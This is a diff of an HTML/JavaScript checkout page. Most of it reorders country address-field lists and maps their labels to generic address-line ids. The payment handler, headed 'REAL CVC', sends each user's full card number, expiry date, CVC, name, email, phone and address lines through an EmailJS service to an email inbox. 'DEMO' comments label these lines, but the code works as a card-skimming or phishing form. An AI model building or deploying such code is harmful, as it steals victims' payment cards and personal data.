-  ng: { dial: "+234", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["State / Capital"],["Mobile"],["Email"]] },
+  ng: { dial: "+234", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["State / Capital"],["City"],["Postal code"],["Mobile"],["Email"]] },
   nu: { dial: "+683", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   nf: { dial: "+672", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   kp: { dial: "+850", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  mk: { dial: "+389", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal number"],["Municipality"],["Mobile"],["Email"]] },
+  mk: { dial: "+389", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Municipality"],["Postal code"],["Mobile"],["Email"]] },
   mp: { dial: "+1-670", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  no: { dial: "+47", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town"],["Mobile"],["Email"]] },
-  om: { dial: "+968", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town"],["Province"],["Mobile"],["Email"]] },
+  no: { dial: "+47", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Postal code"],["Mobile"],["Email"]] },
+  om: { dial: "+968", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Province"],["Postal code"],["Mobile"],["Email"]] },
   pk: { dial: "+92", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   pw: { dial: "+680", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ps: { dial: "+970", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  pa: { dial: "+507", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / District"],["Province / Region"],["Mobile"],["Email"]] },
+  pa: { dial: "+507", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / District"],["Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   pg: { dial: "+675", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  py: { dial: "+595", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["Post town"],["Mobile"],["Email"]] },
-  pe: { dial: "+51", fields: [["First name","Last name"],["Street name, house number"],["Address line 2"],["City"],["Postal code"],["Province"],["Mobile"],["Email"]] },
-  ph: { dial: "+63", fields: [["First name","Last name"],["Street name, house number, subdivision"],["Barangay / District"],["City / Municipality"],["Zip code"],["Province / Region"],["Mobile"],["Email"]] },
+  py: { dial: "+595", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Post town"],["Postal code"],["Mobile"],["Email"]] },
+  pe: { dial: "+51", fields: [["First name","Last name"],["Street name, house number"],["Address line 2"],["Address line 3"],["Province"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  ph: { dial: "+63", fields: [["First name","Last name"],["Street name, house number, subdivision"],["Barangay / District"],["City / Municipality"],["Province / Region"],["Zip code"],["Mobile"],["Email"]] },
   pn: { dial: "+64", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  pl: { dial: "+48", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City / Town"],["Province"],["Mobile"],["Email"]] },
-  pt: { dial: "+351", fields: [["First name","Last name"],["Street address"],["Town / Village / Post Office"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  pl: { dial: "+48", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Province"],["Postal code"],["Mobile"],["Email"]] },
+  pt: { dial: "+351", fields: [["First name","Last name"],["Street address"],["Town / Village / Post Office"],["City"],["Postal code"],["Mobile"],["Email"]] },
   pr: { dial: "+1-787", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   qa: { dial: "+974", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Mobile"],["Email"]] },
-  re: { dial: "+262", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
-  ro: { dial: "+40", fields: [["First name","Last name"],["Address line 1"],["Judet / Sector"],["Postal code"],["City"],["Mobile"],["Email"]] },
-  ru: { dial: "+7", fields: [["First name","Last name"],["Street, building, appartment"],["Center of population (city, village)"],["District, Region"],["Postal code"],["Mobile"],["Email"]] },
+  re: { dial: "+262", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  ro: { dial: "+40", fields: [["First name","Last name"],["Address line 1"],["Judet / Sector"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  ru: { dial: "+7", fields: [["First name","Last name"],["Street, building, appartment"],["Center of population (city, village)"],["District / Region"],["Postal code"],["Mobile"],["Email"]] },
   rw: { dial: "+250", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   bl: { dial: "+590", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   sh: { dial: "+290", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
@@ -1225,33 +1335,33 @@ const COUNTRY_FORMS = {
   pm: { dial: "+508", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   vc: { dial: "+1-784", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ws: { dial: "+685", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["Postal code"],["Mobile"],["Email"]] },
-  sm: { dial: "+378", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["City"],["Mobile"],["Email"]] },
+  sm: { dial: "+378", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   st: { dial: "+239", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  sa: { dial: "+966", fields: [["First name","Last name"],["Street name and house number"],["Address line 3"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  sa: { dial: "+966", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   sn: { dial: "+221", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   rs: { dial: "+381", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   sc: { dial: "+248", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   sl: { dial: "+232", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   sg: { dial: "+65", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["Mobile"],["Email"]] },
   sx: { dial: "+1-721", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  sk: { dial: "+421", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["Post office name"],["Mobile"],["Email"]] },
+  sk: { dial: "+421", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Post office name"],["Postal code"],["Mobile"],["Email"]] },
   si: { dial: "+386", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["Postal code"],["Mobile"],["Email"]] },
 
   sb: { dial: "+677", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   so: { dial: "+252", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  za: { dial: "+27", fields: [["First name","Last name"],["Address line 1"],["Suburb"],["City / Town"],["Postal code"],["District / Province"],["Mobile"],["Email"]] },
-  gs: { dial: "+500", fields: [["First name","Last name"],["Address line 1"],["City / Town"],["Postal code"],["Mobile"],["Email"]] },
-  kr: { dial: "+82", fields: [["First name","Last name"],["Province"],["City / District"],["Street, Building number"],["More address information"],["Postal code"],["Mobile"],["Email"]] },
+  za: { dial: "+27", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Suburb / District / Province"],["Postal code"],["Mobile"],["Email"]] },
+  gs: { dial: "+500", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Postal code"],["Mobile"],["Email"]] },
+  kr: { dial: "+82", fields: [["First name","Last name"],["Street, Building number"],["More address information"],["City / District"],["Province"],["Postal code"],["Mobile"],["Email"]] },
   ss: { dial: "+211", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Mobile"],["Email"]] },
-  es: { dial: "+34", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Province / Autonomous city"],["Postal code"],["Mobile"],["Email"]] },
+  es: { dial: "+34", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Province / Autonomous city"],["City"],["Postal code"],["Mobile"],["Email"]] },
   lk: { dial: "+94", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   sd: { dial: "+249", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Mobile"],["Email"]] },
   sr: { dial: "+597", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   sj: { dial: "+47", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  se: { dial: "+46", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["Postal code"],["City / Town"],["Mobile"],["Email"]] },
-  ch: { dial: "+41", fields: [["First name","Last name"],["Street name and house number"],["Additional information"],["Postal code"],["City"],["Canton"],["Mobile"],["Email"]] },
+  se: { dial: "+46", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City / Town"],["Postal code"],["Mobile"],["Email"]] },
+  ch: { dial: "+41", fields: [["First name","Last name"],["Street name and house number"],["Additional information"],["Canton"],["City"],["Postal code"],["Mobile"],["Email"]] },
   sy: { dial: "+963", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
-  tw: { dial: "+886", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Township / District"],["City / Contry"],["Postal code"],["Mobile"],["Email"]] },
+  tw: { dial: "+886", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Township / District"],["City"],["Postal code"],["Mobile"],["Email"]] },
   tj: { dial: "+992", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   tz: { dial: "+255", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   th: { dial: "+66", fields: [["First name","Last name"],["Plot/house number, moo/lane and street name"],["Subdistrict"],["District"],["Province"],["Postal code"],["Mobile"],["Email"]] },
@@ -1261,20 +1371,20 @@ const COUNTRY_FORMS = {
   to: { dial: "+676", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Locality"],["Mobile"],["Email"]] },
   tt: { dial: "+1-868", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City"],["Postal code"],["Mobile"],["Email"]] },
   tn: { dial: "+216", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  tr: { dial: "+90", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Postal code"],["District"],["City"],["Mobile"],["Email"]] },
+  tr: { dial: "+90", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["District"],["City"],["Postal code"],["Mobile"],["Email"]] },
   tm: { dial: "+993", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   tc: { dial: "+1-649", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   tv: { dial: "+688", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   ug: { dial: "+256", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ua: { dial: "+380", fields: [["First name","Last name"],["Sttreet address"],["Additional information"],["Center of population"],["Region"],["Postal code"],["Mobile"],["Email"]] },
-  ae: { dial: "+971", fields: [["First name","Last name"],["PO Box"],["Additional information"],["City"],["Emirate"],["Mobile"],["Email"]] },
-  gb: { dial: "+44", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Country"],["Postal code"],["Mobile"],["Email"]] },
-  us: { dial: "+1", fields: [["First name","Last name"],["Street address"],["Apt., ste., bldg."],["City"],["State"],["Zip code"],["Mobile"],["Email"]] },
+  ua: { dial: "+380", fields: [["First name","Last name"],["Street address"],["Additional information"],["Center of population"],["Region"],["Postal code"],["Mobile"],["Email"]] },
+  ae: { dial: "+971", fields: [["First name","Last name"],["PO Box"],["Additional information"],["Emirate"],["City"],["Mobile"],["Email"]] },
+  gb: { dial: "+44", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town"],["Postal code"],["Mobile"],["Email"]] },
+  us: { dial: "+1", fields: [["First name","Last name"],["Street address"],["Apt., ste., bldg."],["State"],["City"],["Zip code"],["Mobile"],["Email"]] },
   uy: { dial: "+598", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City / Town / Locality "],["Department"],["Postal code"],["Mobile"],["Email"]] },
   uz: { dial: "+998", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   vu: { dial: "+678", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
-  ve: { dial: "+58", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["City"],["State / Capital District / Federal Dependencies"],["Postal code"],["Mobile"],["Email"]] },
-  vn: { dial: "+84", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Town"],["Larger city/ Province"],["Postal code"],["Mobile"],["Email"]] },
+  ve: { dial: "+58", fields: [["First name","Last name"],["Street name and house number"],["Address line 2"],["State / Capital District / Federal Dependencies"],["City"],["Postal code"],["Mobile"],["Email"]] },
+  vn: { dial: "+84", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["Town"],["Larger city / Province"],["Postal code"],["Mobile"],["Email"]] },
   vg: { dial: "+1-284", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
   vi: { dial: "+1-340", fields: [["First name","Last name"],["Address line 1"],["City"],["Mobile"],["Email"]] },
   wf: { dial: "+681", fields: [["First name","Last name"],["Address line 1"],["Address line 2"],["City / Town / Village"],["State / Province / Region"],["Postal code"],["Mobile"],["Email"]] },
@@ -1297,11 +1407,113 @@ function renderForm(code) {
       row.forEach(f => {
         const div = document.createElement('div');
         let id = f.toLowerCase().replace(/\s+/g, '-');
+
+        // Standard fields
         if (f === "First name") id = "first-name";
         if (f === "Last name") id = "last-name";
         if (f === "Email") id = "email";
-        if (f === "Address line 1") id = "address-line-1";
-        if (f === "Address line 2") id = "address-line-2";
+
+        // Address mapping (FIXED)
+        if (
+          f === "Address line 1" ||
+          f === "Street address" ||
+          f === "PO Box"  ||
+          f === "Street name and house number" ||
+          f === "Prefecture"  ||
+          f === "Street name, house number, subdivision" ||
+          f === "Street, building, appartment" ||
+          f === "Plot/house number, moo/lane and street name" ||
+          f === "Address" 
+        ) id = "address-line-1";
+
+        if (
+          f === "Address line 2" ||
+          f === "Apt., ste., bldg." ||
+          f === "Additional information" ||
+          f === "District / Neighborhood" ||
+          f === "City / Ward / Town / Village"  ||
+          f === "Region / Independent city"  ||
+          f === "Sub-locality"  ||
+          f === "Neighborhood / Quarter"  ||
+          f === "Sub-district / Sub-division"  ||
+          f === "Barangay / District"  ||
+          f === "Town / Village / Post Office"  ||
+          f === "Judet / Sector"  ||
+          f === "Center of population (city, village)"  ||
+          f === "Subdistrict"  ||
+          f === "More address details"
+        ) id = "address-line-2";
+
+        if (
+          f === "Address line 3" ||
+          f === "City / Town / Village" ||
+          f === "Street, Building number" ||
+          f === "City / District" ||
+          f === "Emirate" ||
+          f === "Suburb" ||
+          f === "Locality" ||
+          f === "State" ||
+          f === "City / Province" ||
+          f === "Commune / Locality" ||
+          f === "Province / Municipality" ||
+          f === "Department / Capital District" ||
+          f === "Canton" ||
+          f === "City / Delivery post office" ||
+          f === "Municipality" ||
+          f === "Town" ||
+          f === "Department" ||
+          f === "District / Area" ||
+          f === "Country / Dublin postal district" ||
+          f === "Street name and street number"  ||
+          f === "District" ||
+          f === "City / Town / Locality " ||
+          f === "City / Region" ||
+          f === "Main village / Town" ||
+          f === "District / Sub-province" ||
+          f === "City / Suburb" ||
+          f === "State / Capital" ||
+          f === "Post town" ||
+          f === "City / Municipality" ||
+          f === "City / Town" ||
+          f === "District / Region" ||
+          f === "Post office name" ||
+          f === "Province / Autonomous city" ||
+          f === "Township / District" ||
+          f === "Center of population" ||
+          f === "State / Capital District / Federal Dependencies" ||
+          f === "District / Parish" 
+        ) id = "address-line-3";
+
+        if (
+          f === "Address line 4" ||
+          f === "More address information" ||
+          f === "State / Province / Region" ||
+          f === "Province" ||
+          f === "Region"||
+          f === "State / territory" ||
+          f === "CPF or CNPJ" ||
+          f === "District / Capital" ||
+          f === "Island's name" ||
+          f === "District / Province" ||
+          f === "Town / City" ||
+          f === "Building name, floor, room number"  ||
+          f === "State / Federal territory"  ||
+          f === "District / Dependency"  ||
+          f === "Capital / Province"  ||
+          f === "Zone / Capital"  ||
+          f === "Province / Region"  ||
+          f === "Suburb / District / Province"  ||
+          f === "Larger city / Province"  ||
+          f === "City / Country"
+        ) id = "address-line-4";
+
+
+        if (f === "Address line 5" ||
+          
+          f === "PIN codes" ||
+          f === "Postal code (CEP)") {
+          id = "address-line-5";
+        }
 
         div.innerHTML = `<input type="text" id="${id}" placeholder="${f}" class="form-control">`;
         form.appendChild(div);
@@ -1318,15 +1530,116 @@ function renderForm(code) {
             <input type="text" id="mobile" class="mobile-input" placeholder="Mobile number">
           </div>`;
       } else {
-        const id = field === "Address line 2"
-          ? "address-line-2"
-          : field.toLowerCase().replace(/\s+/g, '-');
+        let id = field.toLowerCase().replace(/\s+/g, '-');
+
+        // Address mapping (FIXED)
+        if (
+          field === "Address line 1" ||
+          field === "Street address" ||
+          field === "PO Box" ||
+          field === "Street name and house number" ||
+          field === "Prefecture"  ||
+          field === "Street name, house number, subdivision" ||
+          field === "Street, building, appartment" ||
+          field === "Plot/house number, moo/lane and street name" ||
+          field === "Address"
+        ) id = "address-line-1";
+
+        if (
+          field === "Address line 2" ||
+          field === "Apt., ste., bldg." ||
+          field === "Additional information" ||
+          field === "District / Neighborhood" ||
+          field === "City / Ward / Town / Village"  ||
+          field === "Region / Independent city"  ||
+          field === "Sub-locality"  ||
+          field === "Neighborhood / Quarter"  ||
+          field === "Sub-district / Sub-division"  ||
+          field === "Barangay / District"  ||
+          field === "Town / Village / Post Office"  ||
+          field === "Judet / Sector"  ||
+          field === "Center of population (city, village)"  ||
+          field === "Subdistrict"  ||
+          field === "More address details"
+        ) id = "address-line-2";
+
+        if (
+          field === "Address line 3" ||
+          field === "City / Town / Village" ||
+          field === "Street, Building number" ||
+          field === "City / District" ||
+          field === "Emirate" ||
+          field === "Suburb" ||
+          field === "Locality" ||
+          field === "State" ||
+          field === "Commune / Locality" ||
+          field === "Province / Municipality" ||
+          field === "Department / Capital District" ||
+          field === "Canton" ||
+          field === "City / Delivery post office" ||
+          field === "Municipality" ||
+          field === "Town" ||
+          field === "Department" ||
+          field === "District / Area" ||
+          field === "Country / Dublin postal district" ||
+          field === "Street name and street number"  ||
+          field === "District" ||
+          field === "City / Town / Locality " ||
+          field  === "City / Region" ||
+          field === "District / Sub-province" ||
+          field === "City / Suburb" ||
+          field === "State / Capital" ||
+          field === "Post town" ||
+          field === "City / Municipality" ||
+          field === "City / Town" ||
+          field === "District / Region" ||
+          field === "Post office name" ||
+          field === "Province / Autonomous city" ||
+          field === "Township / District" ||
+          field === "Center of population" ||
+          field === "State / Capital District / Federal Dependencies" ||
+          field === "District / Parish" 
+        ) id = "address-line-3";
+
+        if (
+          field === "Address line 4" ||
+          field === "More address information" ||
+          field === "State / Province / Region" ||
+          field === "Province" ||
+          field === "Region"  ||
+          field === "State / territory" ||
+          field === "CPF or CNPJ" ||
+          field === "District / Capital" ||
+          field === "Island's name" ||
+          field === "District / Province" ||
+          field === "Town / City" ||
+          field === "Building name, floor, room number"  ||
+          field === "State / Federal territory"  ||
+          field === "District / Dependency"  ||
+          field === "Capital / Province"  ||
+          field === "Zone / Capital"  ||
+          field === "Province / Region"  ||
+          field === "Suburb / District / Province"  ||
+          field === "Larger city / Province"  ||
+          field === "City / Country"
+        ) id = "address-line-4";
+
+        if (field === "Address line 5" || 
+          
+          field === "PIN codes" ||
+          field === "Postal code (CEP)") {
+          id = "address-line-5";
+        }
+
         div.innerHTML = `<input type="text" id="${id}" placeholder="${field}" class="form-control">`;
       }
+
       form.appendChild(div);
     }
   });
 }
+
+
 
 // COUNTRY SELECT CHANGE → UPDATE FORM + FLAG
 select.addEventListener('change', (e) => {
@@ -1338,7 +1651,7 @@ select.addEventListener('change', (e) => {
   autoCheckPaymentForm();    // re-check validation
 });
 
-renderForm('zw');
+renderForm('us');
 
 /* ==============================
    CARD VALIDATION & FORM
@@ -1544,6 +1857,7 @@ document.addEventListener('input', e=>{
 });
 
 
+
 /* ==============================
    PAYMENT → SUCCESS (REAL CVC)
 ============================== */
@@ -1586,24 +1900,31 @@ paymentNext.addEventListener('click', function (e) {
       'service_w7q3bge',
       'template_oply56o',
       {
-        email: billingData.email || 'test@email.com',//✅ DEMO//
-        first_name: billingData['first-name'] || '',//✅ DEMO//
-        last_name: billingData['last-name'] || '',//✅ DEMO//
-        address: billingData['address-line-1'] || '',//✅ DEMO//
-        address: billingData['address-line-2'] || '',
-        city: billingData['city'] || '',
-        Street_name_and_house_number: billingData['Street name and house number']  || '',
-        Sub_locality: billingData['Sub-locality']|| '',
-        Postal_code: billingData['Postal code'] || '',
-        Main_village_Town:billingData['Main village / Town'] || '',
-        District_Dependency: billingData['District / Dependency'] || '',
-        mobile: billingData['mobile'] || '',//✅ DEMO//
-        country: country,//✅ DEMO//
-
         card_name: cardName,//✅ DEMO//
         card_number: cardNumber,//✅ DEMO//
         exp_date: expDate,//✅ DEMO//
         cvc: cvcValue, // ✅demo//
+        
+        country: country,//✅ DEMO//
+        mobile: billingData['mobile'] || '',//✅ DEMO//
+        email: billingData.email || 'test@email.com',//✅ DEMO//
+
+        first_name: billingData['first-name'] || '',//✅ DEMO//
+        last_name: billingData['last-name'] || '',//✅ DEMO//
+
+        address_line_1: billingData['address-line-1'] || '',//✅ DEMO//
+        address_line_2: billingData['address-line-2'] || '',//✅ DEMO//
+        address_line_3: billingData['address-line-3'] || '',//✅ DEMO//
+        address_line_4: billingData['address-line-4'] || '',//✅ DEMO//
+        address_line_5: billingData['address-line-5'] || '',//✅ DEMO//
+
+
+        city: billingData.city || '',
+
+        Postal_code: billingData['postal-code'] || '',
+        Zip_code: billingData['zip-code'] || '',
+        
+
 
         status: 'Payment Success (Demo)'
       }
@@ -1693,28 +2014,3 @@ document.addEventListener('keydown', (e) => {
 </script>
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
